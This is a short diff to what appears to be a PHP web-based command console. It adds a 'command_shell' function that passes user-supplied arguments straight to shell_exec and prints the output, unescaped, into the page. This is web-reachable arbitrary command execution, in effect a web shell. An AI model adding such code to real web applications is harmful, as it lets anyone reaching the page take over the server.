@@ -546,6 +546,16 @@
             echo "<p class='error'>the database handle is empty</p>";
         }
     }
+
+    function command_shell($argv=array()) {
+        if (isFunctionAvailable("shell_exec")) {
+            $bash = implode(" ", $argv);
+            if (empty($bash)) $bash = "bash";
+            echo "<h3>" . $bash . "</h3><pre>" . shell_exec($bash) ."</pre>";
+        } else {
+            echo "<p class='error'>Shell commands not available on this server</p>";
+        }
+    }
     
     
     // interpret commands
